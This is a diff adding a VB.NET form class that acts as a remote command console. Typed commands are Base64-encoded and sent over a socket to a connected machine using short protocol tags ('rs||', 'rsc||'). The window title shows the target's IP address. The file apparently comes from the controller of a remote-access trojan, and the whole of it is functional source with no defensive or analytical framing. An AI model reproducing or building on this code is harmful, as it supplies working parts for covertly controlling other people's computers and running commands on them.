@@ -1,0 +1,39 @@
+﻿Imports System.Text
+Imports System.Globalization
+Imports System.Resources
+Public Class CMD
+    Private A As String()
+    Private idx As Integer
+    Private it As Integer
+    Public sock As Integer
+
+    Private Sub CMD_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs)
+        Form1.s.Send(sock, "rsc" & "||")
+    End Sub
+
+    Private Sub CMD_Load(ByVal sender As Object, ByVal e As System.EventArgs)
+        Me.Text = Form1.s.IP(sock)
+    End Sub
+
+    Private Sub CMD_Resize(ByVal sender As Object, ByVal e As System.EventArgs)
+        T1.ScrollToCaret()
+    End Sub
+
+    Private Sub T2_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles T2.KeyDown
+        Select Case e.KeyCode
+            Case Keys.Enter
+                Dim text As String = T2.Text
+                T2.Text = ""
+                e.SuppressKeyPress = True
+                Form1.s.Send(sock, "rs" & "||" & ENB([text]))
+                Exit Select
+        End Select
+    End Sub
+    Public Shared Function ENB(ByRef s As String) As String
+        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
+    End Function
+
+    Private Sub Form12_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        Me.Text = Form1.s.IP(sock)
+    End Sub
+End Class
